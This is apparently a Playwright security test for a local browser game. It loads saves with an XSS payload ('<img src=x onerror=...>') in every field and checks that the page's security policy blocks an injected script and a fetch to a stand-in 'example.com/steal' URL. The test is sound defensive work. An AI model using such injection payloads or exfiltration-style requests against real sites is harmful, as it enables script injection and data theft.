"""Security: saves with injection payloads or wrong types in every field load safely (no script runs, the game keeps
working), and the page policy blocks injected scripts and all network requests."""
import os, json
from playwright.sync_api import sync_playwright
P='<img src=x onerror="window.__pwned=(window.__pwned||0)+1">'
base={"v":4,"own":[1,0,0,0,0,0,0,0,0,0,0,0],"sound":0}
fields={"sit":P,"life":P,"all":P,"n":P,"clicks":P,"kur":P,"t0":P,"save":P,"votes":P,"refs":P,"won":P,"amt":P,"lang":P,"first":P,"play":P,
        "log":[P,P],"ach":[P],"ups":[P],"amends":[P],"achT":{P:P},"evSeen":{"day":P,P:P},"own":[P]*12,"noHacek":P,"light":P}
with sync_playwright() as p:
  b=p.chromium.launch(executable_path=os.environ.get('CHROME') or None)
  bad=[]
  for k,v in list(fields.items())+[("ALL",None)]:
    st=dict(base,**({k:v} if k!="ALL" else fields))
    c=b.new_context(viewport={'width':1600,'height':900});c.add_init_script("localStorage.setItem('obcine-v2',%s)"%json.dumps(json.dumps(st)))
    pg=c.new_page();errs=[];pg.on('pageerror',lambda e:errs.append(str(e)[:80]))
    pg.goto('http://localhost:8765/');pg.wait_for_timeout(700)
    for a in ('g0','unlock'):
      pg.evaluate(f"try{{act('{a}')}}catch(e){{}}")
    pg.keyboard.press('Space');pg.wait_for_timeout(700)
    pw=pg.evaluate("window.__pwned||0");imgs=pg.evaluate("document.querySelectorAll('img').length")
    alive=pg.evaluate("document.getElementById('p-bell')&&document.getElementById('p-bell').innerText.length>50")
    if pw or imgs or errs or not alive: bad.append((k,'XSS' if pw or imgs else '', errs[:2], 'alive' if alive else 'DEAD'))
    c.close()
  for x in bad: print(x)
  print('checked',len(fields)+1,'cases')

with sync_playwright() as p:  # page policy
  b=p.chromium.launch(executable_path=os.environ.get('CHROME') or None)
  c=b.new_context();pg=c.new_page();msgs=[]
  pg.on('console',lambda m:msgs.append(m.text[:140]) if 'Content Security' in m.text or 'Refused' in m.text else None)
  errs=[];pg.on('pageerror',lambda e:errs.append(str(e)[:100]))
  pg.goto('http://localhost:8765/');pg.wait_for_timeout(1200)
  print('game running:',pg.evaluate("document.getElementById('p-bell').innerText.length>50"),'font:',pg.evaluate("document.fonts.check('14px \"IBM Plex Mono\"')"))
  pg.keyboard.press('Space');pg.wait_for_timeout(200)
  print('violations before injection:',msgs,errs)
  pg.evaluate("""()=>{const d=document.createElement('div');d.innerHTML='<img src=x onerror="window.__pwned=1">';document.body.append(d);
    const s=document.createElement('script');s.textContent='window.__pwned2=1';document.body.append(s);
    fetch('https://example.com/steal').catch(()=>window.__blocked=1)}""");pg.wait_for_timeout(600)
  ok=not pg.evaluate("!!window.__pwned") and not pg.evaluate("!!window.__pwned2") and pg.evaluate("!!window.__blocked")
  assert ok, 'policy'
  print('injected img handler ran:',pg.evaluate("!!window.__pwned"),'| injected script ran:',pg.evaluate("!!window.__pwned2"),'| network blocked:',pg.evaluate("!!window.__blocked"))
assert not bad, bad

print('ALL PASSED')
